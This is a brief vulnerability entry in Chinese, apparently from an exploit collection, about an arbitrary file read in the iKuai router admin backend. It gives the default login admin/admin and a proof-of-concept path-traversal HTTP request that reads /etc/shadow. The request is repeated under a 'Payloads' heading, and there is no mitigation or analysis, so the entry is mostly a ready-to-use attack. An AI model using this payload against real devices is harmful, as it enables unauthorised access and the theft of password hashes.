# iKuai 后台任意文件读取漏洞

## 漏洞描述
参考链接：

- https://forum.ywhack.com/thread-115307-1-8.html

## 危害等级
MEDIUM

## 参考链接
- https://forum.ywhack.com/thread-115307-1-8.html

## 漏洞复现方法
默认用户名/密码：admin/admin

poc：

```
GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1
Host：
....
```

## Payloads
```
GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1
Host：
....
```
